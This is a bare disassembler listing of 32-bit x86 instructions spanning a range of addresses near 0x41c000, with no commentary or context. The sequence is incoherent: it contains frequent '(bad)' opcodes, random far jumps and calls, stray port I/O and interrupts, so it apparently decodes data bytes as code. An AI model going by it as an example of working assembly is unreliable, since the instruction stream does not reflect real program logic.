  41bba2:	mov    bl,0xc4
  41bba4:	or     cl,BYTE PTR [eax-0x4497991e]
  41bbaa:	or     BYTE PTR [edx+0x3c975bdb],ah
  41bbb0:	fst    DWORD PTR [ebx+eax*4+0x22877de5]
  41bbb7:	sar    DWORD PTR [edi+0x58],cl
  41bbba:	mov    bh,0xe
  41bbbc:	pusha  
  41bbbd:	add    BYTE PTR [edi-0x4b4446e6],ah
  41bbc3:	push   ecx
  41bbc4:	test   DWORD PTR [ebp-0x69],edx
  41bbc7:	lods   al,BYTE PTR ds:[esi]
  41bbc8:	out    0x14,eax
  41bbca:	sbb    esp,DWORD PTR [ebp+0x34]
  41bbcd:	jnp    0x41bc3d
  41bbcf:	and    dl,BYTE PTR [ecx+0x68]
  41bbd2:	inc    ebp
  41bbd3:	test   al,0x68
  41bbd5:	int3   
  41bbd6:	jmp    0x828b:0xdb1c6443
  41bbdd:	xor    eax,0x169774a5
  41bbe2:	mov    bh,0x4a
  41bbe4:	and    cl,BYTE PTR [ebx-0x30]
  41bbe7:	rol    DWORD PTR [ebx-0x60],cl
  41bbea:	jo     0x41bb88
  41bbec:	mov    ch,BYTE PTR [ebx+0x31b07008]
  41bbf2:	pop    edx
  41bbf3:	out    dx,al
  41bbf4:	sbb    al,0x81
  41bbf6:	dec    ebp
  41bbf7:	or     eax,0x21da1d2a
  41bbfc:	shl    DWORD PTR [esi+0x7c48771f],1
  41bc02:	inc    al
  41bc04:	repz and dl,ah
  41bc07:	or     eax,0x541959f3
  41bc0c:	mov    dh,0xe8
  41bc0e:	test   DWORD PTR [ebx],0xf7551ea1
  41bc14:	int    0x82
  41bc16:	test   al,0xcd
  41bc18:	xchg   ebp,eax
  41bc19:	jmp    0x41bc14
  41bc1b:	add    BYTE PTR [ebx+0xae7cb62],dl
  41bc21:	lahf   
  41bc22:	cs jg  0x41bc00
  41bc25:	adc    edi,DWORD PTR [ecx+esi*1]
  41bc28:	retf   
  41bc29:	jmp    0x9191:0xb1ff1325
  41bc30:	test   ecx,edi
  41bc32:	out    0xa1,eax
  41bc34:	rol    BYTE PTR [eax],cl
	...
  41bc96:	shl    BYTE PTR [edx],cl
  41bc98:	cli    
  41bc99:	clc    
  41bc9a:	cli    
  41bc9b:	clc    
  41bc9c:	sar    BYTE PTR [edx],cl
  41bc9e:	js     0x78f9248d
  41bca4:	mov    dh,dh
  41bca6:	cmp    DWORD PTR ds:0x1070001,esp
  41bcac:	add    BYTE PTR [eax],al
  41bcae:	retf   0xd66f
  41bcb1:	sub    dh,BYTE PTR [ecx-0x19]
  41bcb4:	(bad)  
  41bcb5:	jl     0x41bd2e
  41bcb7:	loop   0x41bcb9
  41bcb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcba:	test   BYTE PTR [esi+0x62b819f8],cl
  41bcc0:	repz dec esi
  41bcc2:	in     eax,dx
  41bcc3:	aad    0x2a
  41bcc5:	sub    ch,BYTE PTR [si-0x2e]
  41bcc9:	ror    DWORD PTR [ebx],0xf8
  41bccc:	fwait
  41bccd:	sub    al,0x92
  41bccf:	lea    eax,[edx-0xa5cba10]
  41bcd5:	inc    esi
  41bcd6:	call   0x4f82:0x3a029a51
  41bcdd:	dec    ebx
  41bcde:	call   0x5dec:0xebd43118
  41bce5:	mov    cl,0x70
  41bce7:	out    dx,al
  41bce8:	lock data16 cli 
  41bceb:	xchg   ecx,eax
  41bcec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bced:	shr    BYTE PTR [eax-0x77],0xb2
  41bcf1:	adc    ecx,DWORD PTR [esi+0x26]
  41bcf4:	lds    ebp,FWORD PTR [edx]
  41bcf6:	fld    DWORD PTR [eax-0x3c5363eb]
  41bcfc:	mov    es,WORD PTR [ecx]
  41bcfe:	mov    bl,0xc6
  41bd00:	pop    es
  41bd01:	xor    cl,BYTE PTR [esi]
  41bd03:	inc    ebp
  41bd04:	popf   
  41bd05:	pop    ecx
  41bd06:	dec    ebx
  41bd07:	jns    0x41bcd0
  41bd09:	sbb    DWORD PTR [ecx-0x7181fbbe],edx
  41bd0f:	cmc    
  41bd10:	sbb    BYTE PTR [eax+0xfed837c],dl
  41bd16:	mov    al,ds:0x6721524c
  41bd1b:	jmp    0x41bd58
  41bd1d:	into   
  41bd1e:	pop    ebp
  41bd1f:	punpckhbw mm3,QWORD PTR [edx]
  41bd22:	inc    edi
  41bd23:	repz out 0x45,al
  41bd26:	clc    
  41bd27:	and    ch,BYTE PTR [edi]
  41bd29:	push   cs
  41bd2a:	test   DWORD PTR [esi+ecx*4-0x59],0xd09901b2
  41bd32:	inc    ecx
  41bd33:	int    0x27
  41bd35:	retf   0x5df
  41bd38:	pop    esi
  41bd39:	or     ebp,DWORD PTR [ebp+0x525a0d06]
  41bd3f:	pop    esp
  41bd40:	cmp    ecx,DWORD PTR [ecx-0x1d8fb308]
  41bd46:	in     eax,dx
  41bd47:	fs fs in eax,dx
  41bd4a:	clc    
  41bd4b:	add    eax,0x6bfa717d
  41bd50:	push   ebp
  41bd51:	ds nop
  41bd53:	lods   eax,DWORD PTR ds:[esi]
  41bd54:	jno    0x41bdb5
  41bd56:	icebp  
  41bd57:	repz rcr DWORD PTR [ecx-0x61],cl
  41bd5b:	inc    ecx
  41bd5c:	inc    esi
  41bd5d:	jp     0x41bd5f
  41bd5f:	push   esi
  41bd60:	mov    ds:0xc71cbd1d,al
  41bd65:	out    0x63,al
  41bd67:	cmp    DWORD PTR [ebp+0x4b],edi
  41bd6a:	into   
  41bd6b:	jge    0x41bd92
  41bd6d:	fstp   TBYTE PTR [ebp-0x5]
  41bd70:	mov    ds:0x371b4d62,al
  41bd75:	xor    al,0xea
  41bd77:	jg     0x41bd39
  41bd79:	iret   
  41bd7a:	enter  0x4a06,0xf9
  41bd7e:	xor    ah,ah
  41bd80:	loope  0x41bd2a
  41bd82:	ss lock cld 
  41bd85:	pop    esp
  41bd86:	xchg   al,al
  41bd88:	cdq    
  41bd89:	cmp    eax,DWORD PTR [edx+esi*1]
  41bd8c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bd8d:	mov    al,0x4e
  41bd8f:	and    eax,0xaea74
  41bd94:	into   
  41bd95:	add    eax,DWORD PTR [esi]
  41bd97:	push   eax
  41bd98:	push   0x52f617c0
  41bd9d:	jbe    0x41bd8e
  41bd9f:	stos   BYTE PTR es:[edi],al
  41bda0:	adc    eax,0xeca50625
  41bda5:	jne    0x41bd59
  41bda7:	inc    edx
  41bda8:	(bad)  
  41bda9:	call   0xc2ae9f34
  41bdae:	fnstenv [edi+0x2db00e02]
  41bdb4:	cld    
	...
  41be15:	add    BYTE PTR [ebp-0x63956373],al
  41be1b:	jnp    0x41be14
  41be1d:	out    dx,eax
  41be1e:	add    BYTE PTR [ebp-0x32],dh
  41be21:	push   edx
  41be22:	rep stos DWORD PTR es:[edi],eax
  41be24:	mov    cs,WORD PTR [edi+0x40]
  41be27:	add    DWORD PTR es:[eax],eax
  41be2a:	pop    es
  41be2b:	add    DWORD PTR [eax],eax
  41be2d:	add    cl,bh
  41be2f:	rol    BYTE PTR [edx],cl
  41be31:	aaa    
  41be32:	test   BYTE PTR [esi-0xfa647bb],al
  41be38:	lock or dh,0x69
  41be3c:	dec    ebp
  41be3d:	mov    esp,0xdf76c2b2
  41be42:	js     0x41be43
  41be44:	mov    eax,0x686fba5a
  41be49:	leave  
  41be4a:	xor    ecx,DWORD PTR [edx]
  41be4c:	mov    cs,WORD PTR [ebp+0x1c]
  41be4f:	scas   al,BYTE PTR es:[edi]
  41be50:	xchg   ecx,eax
  41be51:	xor    DWORD PTR [edx],edx
  41be53:	inc    ebx
  41be54:	xchg   ebx,eax
  41be55:	xor    ebx,edi
  41be57:	stc    
  41be58:	mov    bh,0x23
  41be5a:	xchg   ebp,eax
  41be5b:	mov    esi,0xe849f4b5
  41be60:	mov    ds:0xcf273f13,eax
  41be65:	lods   al,BYTE PTR ds:[esi]
  41be66:	sar    DWORD PTR [eax-0x42],0xaa
  41be6a:	daa    
  41be6b:	push   ebp
  41be6c:	adc    al,cl
  41be6e:	jno    0x41be87
  41be70:	ret    0xfea7
  41be73:	jno    0x41be3e
  41be75:	xor    DWORD PTR [eax+0x39],edi
  41be78:	cmp    ch,al
  41be7a:	adc    BYTE PTR [edi+ebx*1+0x22],dl
  41be7e:	call   0x6ed5:0xd9962950
  41be85:	sar    DWORD PTR [eax],1
  41be87:	ds call 0xd0c3:0x20813f6d
  41be8f:	push   esp
  41be90:	inc    eax
  41be91:	mov    ebx,0x11038cf8
  41be96:	(bad)  
  41be97:	jp     0x41bef2
  41be99:	dec    eax
  41be9a:	dec    eax
  41be9b:	cs pusha 
  41be9d:	mov    ebp,DWORD PTR ds:0xf53845e2
  41bea3:	xor    al,0x6f
  41bea5:	xlat   BYTE PTR ds:[ebx]
  41bea6:	mov    ch,0x4
  41bea8:	in     eax,dx
  41bea9:	sub    ebx,0xffffff9b
  41beac:	int3   
  41bead:	adc    BYTE PTR [ebx+ebp*1-0x28c22ce2],0xd8
  41beb5:	test   BYTE PTR [ebx+edi*8-0x4827e17e],bh
  41bebc:	cmp    eax,0x294829be
  41bec1:	dec    ebx
  41bec2:	std    
  41bec3:	mov    ebp,0xeff64de0
  41bec8:	ins    DWORD PTR es:[edi],dx
  41bec9:	aam    0x37
  41becb:	cmp    eax,0x25d6884a
  41bed0:	pop    es
  41bed1:	fadd   st,st(2)
  41bed3:	stos   BYTE PTR es:[edi],al
  41bed4:	inc    edx
  41bed5:	test   eax,0x43385440
  41beda:	dec    esi
  41bedb:	add    cl,BYTE PTR [ebx+0x2e]
  41bede:	sub    eax,0x294b132c
  41bee3:	add    cl,ah
  41bee5:	cmp    al,0x13
  41bee7:	stc    
  41bee8:	fs test ecx,esp
  41beeb:	shl    DWORD PTR [esi+0x7],0xe7
  41beef:	inc    edi
  41bef0:	call   0x6eebfa56
  41bef5:	repz fisttp QWORD PTR [ecx+0x3c]
  41bef9:	retf   
  41befa:	xor    DWORD PTR [ebp-0x27],esp
  41befd:	aas    
  41befe:	push   cs
  41beff:	arpl   WORD PTR [ebp-0x116299c5],sp
  41bf05:	adc    eax,0xf50a964c
  41bf0a:	call   0xc5aa9368
  41bf0f:	cdq    
  41bf10:	dec    esp
  41bf11:	jle    0x41bef0
  41bf13:	div    DWORD PTR [edx]
  41bf15:	mov    eax,0x5643c2f1
  41bf1a:	mov    ebx,0x174b868e
  41bf1f:	cmp    al,0xfd
  41bf21:	pusha  
  41bf22:	loope  0x41bfa0
  41bf24:	out    dx,al
  41bf25:	fild   QWORD PTR [ecx+0x4e]
  41bf28:	pop    ss
  41bf29:	mov    ch,0x1a
  41bf2b:	xor    dh,BYTE PTR ss:[ebx]
  41bf2e:	sub    eax,0xf407bbf9
  41bf33:	icebp  
  41bf34:	icebp  
	...
  41bf95:	add    BYTE PTR [ebx+esi*2+0x33],ah
  41bf99:	es aaa 
  41bf9b:	data16 jne 0x41c011
  41bf9e:	pop    ds
  41bf9f:	sub    DWORD PTR [ebx],ebp
  41bfa1:	daa    
  41bfa2:	leave  
  41bfa3:	and    bh,bl
  41bfa5:	sbb    eax,DWORD PTR [edi+0x27]
  41bfa8:	add    DWORD PTR [eax],eax
  41bfaa:	pop    es
  41bfab:	add    DWORD PTR [eax],eax
  41bfad:	add    BYTE PTR [esi+0x4ddbe16a],dl
  41bfb3:	or     bl,BYTE PTR [edx-0x5f]
  41bfb6:	push   0xe2647504
  41bfbb:	ret    0xc48d
  41bfbe:	pop    edx
  41bfbf:	repz xchg edx,eax
  41bfc1:	shr    DWORD PTR [ebx],0xfe
  41bfc4:	or     al,0xe5
  41bfc6:	sbb    DWORD PTR [ebx+0x60eee52],edx
  41bfcc:	cli    
  41bfcd:	push   ecx
  41bfce:	(bad)
  41bfd1:	lods   al,BYTE PTR ds:[esi]
  41bfd2:	loopne 0x41bf55
  41bfd4:	xchg   ebx,eax
  41bfd5:	and    dl,BYTE PTR [ebx]
  41bfd7:	or     bl,BYTE PTR [ecx+edi*8-0x7f916ce6]
  41bfde:	ret    
  41bfdf:	inc    esi
  41bfe0:	cwde   
  41bfe1:	das    
  41bfe2:	pop    ecx
  41bfe3:	mov    ah,0xad
  41bfe5:	addr16 in al,dx
  41bfe7:	inc    edx
  41bfe8:	cld    
  41bfe9:	pusha  
  41bfea:	(bad)  
  41bfeb:	outs   dx,DWORD PTR ds:[esi]
  41bfec:	test   eax,0xdcf230c0
  41bff1:	pop    ds
  41bff2:	lock sbb BYTE PTR [ecx-0x2837227e],bl
  41bff9:	mov    cl,0x89
  41bffb:	xchg   esp,eax
  41bffc:	ins    BYTE PTR es:[edi],dx
  41bffd:	aaa    
  41bffe:	(bad)  
  41bfff:	cld    
  41c000:	sbb    al,0x9e
  41c002:	test   eax,0x8e25a8ad
  41c007:	push   eax
  41c008:	test   eax,0xb3786489
  41c00d:	in     al,0xcd
  41c00f:	int    0x1f
  41c011:	xchg   esi,eax
  41c012:	sbb    eax,0x9cdd656
  41c017:	sbb    al,0x57
  41c019:	mov    al,0x7b
  41c01b:	inc    edi
  41c01c:	jmp    0xa7d9:0x43dcdb45
  41c023:	lea    esp,[ebx+0x66]
  41c026:	or     DWORD PTR [eax+0x76],esi
  41c029:	loop   0x41bff4
  41c02b:	or     BYTE PTR [ebx+0x382cda25],0xcb
  41c032:	pop    edi
  41c033:	loope  0x41c068
  41c035:	xor    BYTE PTR [eax-0x5e],al
  41c038:	iret   
  41c039:	xlat   BYTE PTR ds:[ebx]
  41c03a:	repnz xchg edi,eax
  41c03c:	nop
  41c03d:	mov    cl,0xc6
  41c03f:	pop    esi
  41c040:	add    edi,DWORD PTR [eax+0x15ad1251]
  41c046:	test   eax,0xa9e195bf
  41c04b:	xchg   ebx,eax
  41c04c:	add    bl,BYTE PTR [ecx+0x37c56894]
  41c052:	cmc    
  41c053:	mov    al,BYTE PTR [ecx-0x29]
  41c056:	cmp    BYTE PTR [eax-0x48697264],bl
  41c05c:	xchg   esp,ecx
  41c05e:	repz jge 0x41c078
  41c061:	adc    al,0x76
  41c063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c064:	fimul  DWORD PTR [ecx]
  41c066:	jmp    0xaa713fae
  41c06b:	xchg   BYTE PTR [edi-0x3],al
  41c06e:	ds mov ebp,0x6c8510fc
  41c074:	fwait
  41c075:	int    0x5
  41c077:	pop    edi
  41c078:	mov    ecx,0x901262ac
  41c07d:	mov    gs,WORD PTR [eax+0x5c]
  41c080:	or     WORD PTR ds:0x1a32f268,di
  41c087:	icebp  
  41c088:	(bad)  
  41c089:	fcom   st(0)
  41c08b:	mov    esi,0x32b1841a
  41c090:	fdiv   QWORD PTR [edx-0x15238bc5]
  41c096:	loop   0x41c07d
  41c098:	popa   
  41c099:	xchg   ebx,eax
  41c09a:	mov    edi,0x181e3c00
  41c09f:	xchg   DWORD PTR [ebx+0x7],esp
  41c0a2:	aaa    
  41c0a3:	xor    edx,0xfffffffb
  41c0a6:	lahf   
  41c0a7:	(bad)
  41c0ab:	cmc    
  41c0ac:	sbb    DWORD PTR [ebx-0x6e],esi
  41c0af:	lock and BYTE PTR [esi+0x4b],dl
  41c0b3:	retf   0x4
	...
  41c116:	(bad)  [edx-0x5f]
  41c119:	clc    
  41c11a:	mov    bl,0xfb
  41c11c:	fldcw  WORD PTR [ebx+0x49]
  41c11f:	xlat   BYTE PTR ds:[ebx]
  41c120:	mov    ebp,0xc3aa8f8
  41c125:	inc    esp
  41c126:	dec    esi
  41c127:	sub    BYTE PTR [ecx],al
  41c129:	add    BYTE PTR [edi],al
  41c12b:	add    DWORD PTR [eax],eax
  41c12d:	add    BYTE PTR [ecx-0x56357082],ah
  41c133:	scas   eax,DWORD PTR es:[edi]
  41c134:	sti    
  41c135:	stos   BYTE PTR es:[edi],al
  41c136:	shl    cl,1
  41c138:	retf   0x4a37
  41c13b:	xchg   ebx,eax
  41c13c:	pop    es
  41c13d:	jno    0x41c14a
  41c13f:	rcr    BYTE PTR [edx],cl
  41c141:	push   ds
  41c142:	xor    bh,BYTE PTR [ecx+0x29]
  41c145:	pop    es
  41c146:	jle    0x41c1be
  41c148:	cmp    BYTE PTR [edx],cl
  41c14a:	lods   eax,DWORD PTR ds:[esi]
  41c14b:	pop    es
  41c14c:	dec    ebp
  41c14d:	inc    esi
  41c14e:	addr16 push esi
  41c150:	stos   DWORD PTR es:[edi],eax
  41c151:	fisub  DWORD PTR [edi+0x3fa22cf0]
  41c157:	in     al,0xe1
  41c159:	div    esi
  41c15b:	cmp    DWORD PTR [edi],0xffffffc6
  41c15e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c15f:	inc    edi
  41c160:	mov    es:0x6bf40b89,al
  41c166:	hlt    
  41c167:	imul   esp,DWORD PTR [esi+esi*4],0xffffffb3
  41c16b:	outs   dx,DWORD PTR ds:[esi]
  41c16c:	add    eax,0x4c280472
  41c171:	push   eax
  41c172:	jmp    0x41c16c
  41c174:	out    dx,al
  41c175:	ds cmp eax,0xc2583932
  41c17b:	xchg   esp,eax
  41c17c:	in     eax,0xd4
  41c17e:	push   edx
  41c17f:	or     DWORD PTR [esp+ebp*8+0x14caedcb],esp
  41c186:	std    
  41c187:	and    ebx,DWORD PTR [edx-0x54]
  41c18a:	aas    
  41c18b:	and    al,0xe2
  41c18d:	dec    esi
  41c18e:	cmp    DWORD PTR [edx+0x34],edx
  41c191:	out    dx,eax
  41c192:	cmp    al,0xb8
  41c194:	cld    
  41c195:	mov    sp,0x7252
  41c199:	aaa    
  41c19a:	mov    eax,0xda31b86c
  41c19f:	sbb    esi,DWORD PTR [esi+eax*1-0x56e97a3c]
  41c1a6:	pop    esi
  41c1a7:	push   esi
  41c1a8:	sbb    ebp,DWORD PTR [ecx+0x49]
  41c1ab:	icebp  
  41c1ac:	sbb    ebp,esp
  41c1ae:	or     eax,0xd22bd6ab
  41c1b3:	push   edi
  41c1b4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1b5:	dec    ebx
  41c1b6:	pop    es
  41c1b7:	imul   eax,DWORD PTR [ebp+ebp*2-0x8256047],0x39
  41c1bf:	xor    dl,BYTE PTR [edx+0x12cf2a5]
  41c1c5:	mov    bh,0xa3
  41c1c7:	mov    ebx,0xa7b1659f
  41c1cc:	mov    bh,0xd5
  41c1ce:	repnz jecxz 0x41c1c4
  41c1d1:	or     al,BYTE PTR [edi]
  41c1d3:	sbb    al,0x61
  41c1d5:	lods   eax,DWORD PTR ds:[esi]
  41c1d6:	inc    esp
  41c1d7:	imul   esp,eax,0x6a
  41c1da:	or     ch,bl
  41c1dc:	add    eax,0xb7e984df
  41c1e1:	add    DWORD PTR [edx+0x21],esp
  41c1e4:	fcomp  DWORD PTR [ecx+0x72]
  41c1e7:	shr    DWORD PTR [esi-0x1ffb8249],cl
  41c1ed:	dec    ecx
  41c1ee:	adc    eax,0x32c8866e
  41c1f3:	and    edi,edx
  41c1f5:	sbb    BYTE PTR [ebp-0x446879f3],dh
  41c1fb:	or     BYTE PTR [ebp+0x14],ch
  41c1fe:	jo     0x41c21b
  41c200:	ja     0x41c24d
  41c202:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c203:	cmp    BYTE PTR [esi],cl
  41c205:	mov    BYTE PTR [edi+0x38],al
  41c208:	iret   
  41c209:	add    eax,DWORD PTR [ebx]
  41c20b:	ret    
  41c20c:	sbb    ch,al
  41c20e:	ffreep st(6)
  41c210:	lds    esi,FWORD PTR [edi+0x7]
  41c213:	inc    edi
  41c214:	cmp    bl,BYTE PTR [eax]
  41c216:	pop    esp
  41c217:	mov    cl,BYTE PTR [eax+0x78]
  41c21a:	retf   0x699e
  41c21d:	add    al,0xf4
  41c21f:	pop    esp
  41c220:	inc    esp
  41c221:	inc    edx
  41c222:	sub    ebp,ebp
  41c224:	add    dh,cl
  41c226:	or     BYTE PTR [esi-0x2c],bh
  41c229:	popf   
  41c22a:	jbe    0x41c1bb
  41c22c:	pop    edi
  41c22d:	xchg   ecx,eax
  41c22e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c22f:	sub    BYTE PTR [edx],dh
  41c231:	ret    0x668
  41c234:	ret    0x0
	...
  41c293:	add    BYTE PTR [eax],al
  41c295:	add    bl,dh
  41c297:	and    ebp,ecx
  41c299:	push   ebp
  41c29a:	(bad)  
  41c29c:	sti    
  41c29d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c29e:	push   esp
  41c29f:	mov    WORD PTR [edi+0x3f],?
  41c2a2:	int    0x23
  41c2a4:	mov    WORD PTR ds:0x12955,es
  41c2aa:	pop    es
  41c2ab:	add    DWORD PTR [eax],eax
  41c2ad:	add    BYTE PTR [edi-0x941ef26],al
  41c2b3:	call   0x916b1945
  41c2b8:	push   0xffffffdf
  41c2ba:	sub    BYTE PTR [esi-0x31e9468f],dh
  41c2c0:	adc    DWORD PTR [ebp+0x59],edx
  41c2c3:	lock lods al,BYTE PTR ds:[esi]
  41c2c5:	in     al,0x8b
  41c2c7:	push   ecx
  41c2c8:	sti    
  41c2c9:	push   ss
  41c2ca:	jno    0x41c2ac
  41c2cc:	cmp    cl,0xf9
  41c2cf:	pop    esi
  41c2d0:	add    eax,0xe4330f63
  41c2d5:	pop    ds
  41c2d6:	inc    edi
  41c2d7:	add    ah,bl
  41c2d9:	pop    edx
  41c2da:	out    dx,al
  41c2db:	jmp    0xc0df:0x164fb656
  41c2e2:	lods   eax,DWORD PTR ds:[esi]
  41c2e3:	xor    eax,0x1de58a47
  41c2e8:	loopne 0x41c2fe
  41c2ea:	xchg   BYTE PTR [esi-0x42],al
  41c2ed:	or     dl,BYTE PTR [ecx+ecx*8+0x30ed2c0e]
  41c2f4:	and    dl,BYTE PTR [edx+0x57]
  41c2f7:	adc    eax,0xcffe604a
  41c2fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2fd:	and    cl,BYTE PTR [ebx-0x46]
  41c300:	or     ebp,ebx
  41c302:	sbb    eax,0xcf871c73
  41c307:	inc    eax
  41c308:	arpl   WORD PTR [edx+0x1e51b965],ax
  41c30e:	scas   eax,DWORD PTR es:[edi]
  41c30f:	mov    ah,BYTE PTR [edx+0x6]
  41c312:	ret    
  41c313:	(bad)  
  41c314:	call   0xae1b59f
  41c319:	mov    ch,0x83
  41c31b:	rcl    ch,0x55
  41c31e:	pop    ds
  41c31f:	or     cl,BYTE PTR [ebx]
  41c321:	or     ecx,eax
  41c323:	enter  0xf2d5,0xa0
  41c327:	mov    ?,WORD PTR [edx]
  41c329:	fdiv   st,st(2)
  41c32b:	jno    0x41c301
  41c32d:	sub    ebx,DWORD PTR [esi-0x1ee6913c]
  41c333:	cld    
  41c334:	cli    
  41c335:	(bad)  
  41c336:	aad    0xd0
  41c338:	push   ebx
  41c339:	shr    DWORD PTR [bx+di-0x6bbf],0x60
  41c33f:	ins    BYTE PTR es:[edi],dx
  41c340:	mov    bl,0x6d
  41c342:	xchg   cl,ah
  41c344:	call   0xfb6f:0x4e277658
  41c34b:	fiadd  WORD PTR [eax+0x139192f1]
  41c351:	aam    0xf6
  41c353:	or     BYTE PTR [edi+0x1cddc1f2],dh
  41c359:	mov    al,0x5b
  41c35b:	ret    
  41c35c:	ror    dh,cl
  41c35e:	popf   
  41c35f:	mov    fs,WORD PTR ds:0xcd617703
  41c365:	mov    dl,0x26
  41c367:	or     DWORD PTR [ecx+0x782b9c09],ebp
  41c36d:	push   esp
  41c36e:	and    DWORD PTR ds:0x5ea53803,ecx
  41c374:	xchg   ebx,ebp
  41c376:	jmp    0x41c331
  41c378:	inc    ebx
  41c379:	sbb    ch,bh
  41c37b:	sub    esp,eax
  41c37d:	or     BYTE PTR [edi-0xb],cl
  41c380:	shr    BYTE PTR [bx+0x6e],1
  41c384:	mov    edi,0xed20dd54
  41c389:	push   0x7a
  41c38b:	mov    bl,0x89
  41c38d:	rcl    BYTE PTR [edi],cl
  41c38f:	push   esp
  41c390:	arpl   si,dx
  41c392:	sub    ebx,DWORD PTR [eax-0x1d]
  41c395:	dec    edi
  41c396:	mov    dh,0x20
  41c398:	daa    
  41c399:	push   ebx
  41c39a:	xor    esp,eax
  41c39c:	je     0x41c340
  41c39e:	sbb    al,0xca
  41c3a0:	mov    edi,esp
  41c3a2:	lahf   
  41c3a3:	xchg   ecx,eax
  41c3a4:	xchg   edi,eax
  41c3a5:	jae    0x41c37c
  41c3a7:	cdq    
  41c3a8:	pop    ebp
  41c3a9:	addr16 mov ah,0x9e
  41c3ac:	(bad)  
  41c3ad:	dec    ebp
  41c3ae:	inc    ebp
  41c3af:	loope  0x41c3d3
  41c3b1:	adc    DWORD PTR [eax-0x4a],ebx
  41c3b4:	mov    BYTE PTR [eax],al
	...
  41c416:	push   ebx
  41c417:	and    BYTE PTR [eax+0x5faef3ae],ah
  41c41d:	std    
  41c41e:	mov    ah,0x86
  41c420:	jmp    FWORD PTR [ebp+eax*8+0x14]
  41c424:	shl    ah,cl
  41c426:	pop    esp
  41c427:	sub    al,BYTE PTR [ecx]
  41c429:	add    BYTE PTR [edi],al
  41c42b:	add    DWORD PTR [eax],eax
  41c42d:	add    BYTE PTR [ecx+0x87817f8],bl
  41c433:	aaa    
  41c434:	xor    al,BYTE PTR [edi-0x2c]
  41c437:	into   
  41c438:	repnz sub eax,0x54984460
  41c43e:	pop    ebp
  41c43f:	xor    al,0xdd
  41c441:	dec    ebx
  41c442:	rcr    DWORD PTR [ecx-0x72b645b5],cl
  41c448:	cld    
  41c449:	(bad)  
  41c44a:	dec    esi
  41c44b:	mov    al,0x92
  41c44d:	pop    edi
  41c44e:	scas   eax,DWORD PTR es:[edi]
  41c44f:	pop    ss
  41c450:	lahf   
  41c451:	arpl   dx,bp
  41c453:	mov    eax,ds:0x75c3f0d6
  41c458:	pop    ss
  41c459:	xchg   ebx,eax
  41c45a:	lock pusha 
  41c45c:	mov    ch,al
  41c45e:	jnp    0x41c40c
  41c460:	xchg   edi,eax
  41c461:	fs in  al,0x11
  41c464:	pop    edi
  41c465:	push   es
  41c466:	push   ecx
  41c467:	lods   eax,DWORD PTR ds:[esi]
  41c468:	ds xchg esp,eax
  41c46a:	aaa    
  41c46b:	jp     0x41c469
  41c46d:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c46f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c470:	sar    BYTE PTR [ebx-0x23684bc7],1
  41c476:	mov    bh,0x8d
  41c478:	das    
  41c479:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c47a:	sti    
  41c47b:	add    esi,DWORD PTR [ecx+0x45]
  41c47e:	add    dh,al
  41c480:	pop    edx
  41c481:	push   ecx
  41c482:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c483:	pop    esp
  41c484:	(bad)  
  41c485:	xchg   ebx,eax
  41c486:	push   eax
  41c487:	jmp    ebx
  41c489:	xchg   esp,eax
  41c48a:	into   
  41c48b:	in     eax,dx
  41c48c:	dec    esp
  41c48d:	test   eax,0x4c286e33
  41c492:	arpl   WORD PTR es:[eax+ebx*1-0x6f554092],bx
  41c49a:	ret    
  41c49b:	sub    eax,esp
  41c49d:	int3   
  41c49e:	mov    esp,0xd7e1ff4d
  41c4a3:	std    
  41c4a4:	xchg   ebp,eax
  41c4a5:	mul    DWORD PTR [ecx-0x6b]
  41c4a8:	ds cmp esi,ebx
  41c4ab:	pop    ds
  41c4ac:	test   BYTE PTR [edi+0x2460a95c],bl
  41c4b2:	je     0x41c46d
  41c4b4:	dec    esi
  41c4b5:	outs   dx,DWORD PTR ds:[esi]
  41c4b6:	imul   esi,DWORD PTR [ebx+0x174556cd],0x34
  41c4bd:	lock add ecx,DWORD PTR [edi-0x4fc8b518]
  41c4c4:	aaa    
  41c4c5:	adc    ah,BYTE PTR [edi+edx*8]
  41c4c8:	(bad)  
  41c4c9:	in     eax,dx
  41c4ca:	mov    ds:0xc9ab5e15,eax
  41c4cf:	sub    eax,0x6c66115c
  41c4d4:	adc    BYTE PTR [esp+edx*2-0x77a6a85d],0x74
  41c4dc:	imul   eax,DWORD PTR [ebx],0x11d0d681
  41c4e2:	mov    ebx,0xd3b5e6a2
  41c4e7:	xchg   BYTE PTR [esi-0x5a],al
  41c4ea:	cld    
  41c4eb:	sub    ebx,DWORD PTR [ecx+ebx*8-0x50e63c8a]
  41c4f2:	push   esi
  41c4f3:	sub    BYTE PTR [ebx+0x44],0xe2
  41c4f7:	xchg   esi,eax
  41c4f8:	push   edi
  41c4f9:	sub    ebx,DWORD PTR [eax]
  41c4fb:	sub    al,0xce
  41c4fd:	scas   eax,DWORD PTR es:[edi]
  41c4fe:	jo     0x41c48b
  41c500:	cs aas 
  41c502:	aaa    
  41c503:	loop   0x41c529
  41c505:	xchg   ecx,eax
  41c506:	sub    eax,0xfff2ab05
  41c50b:	and    BYTE PTR [edi+0x7ae14629],bh
  41c511:	mov    eax,ds:0x43128d7d
  41c516:	adc    ah,BYTE PTR [ebx+ecx*4-0x7f0cdc6b]
  41c51d:	aaa    
  41c51e:	push   edi
  41c51f:	jb     0x41c54d
  41c521:	lods   al,BYTE PTR ds:[esi]
  41c522:	adc    DWORD PTR [ebp+0x13f5accf],esi
  41c528:	adc    BYTE PTR [ecx+0x7c543ba1],0x5e
  41c52f:	mov    ebp,gs
  41c531:	xor    eax,0x42be7a
	...
  41c596:	lds    esp,FWORD PTR [ebx]
  41c598:	xchg   ecx,eax
  41c599:	and    eax,0xe3f5b7f7
  41c59e:	sbb    ch,BYTE PTR [edx+0x10]
  41c5a1:	stc    
  41c5a2:	add    esi,ebx
